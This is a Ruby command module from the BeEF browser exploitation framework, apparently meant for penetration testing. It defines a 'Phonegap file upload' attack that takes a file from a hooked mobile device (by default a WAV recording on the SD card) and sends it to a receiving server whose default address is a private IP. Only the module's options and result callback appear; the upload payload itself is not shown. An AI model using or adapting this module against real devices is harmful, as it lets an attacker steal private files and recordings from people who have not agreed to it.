#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# phonegap
#

class Phonegap_file_upload < BeEF::Core::Command
  
    def self.options
        return [{
            'name' => 'file_upload_dst', 
            'description' => 'Upload a file from device to your server', 
            'ui_label'=>'Destination', 
            'value' => 'http://192.168.9.130/recv-unauth.php',
            'width' => '300px'
            },{
            'name' => 'file_upload_src',    
            'description' => 'path to file on device', 
            'ui_label'=>'File Path', 
            'value' => '/sdcard/myrecording.wav',
            'width' => '300px'
            }]
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content

  end 
end
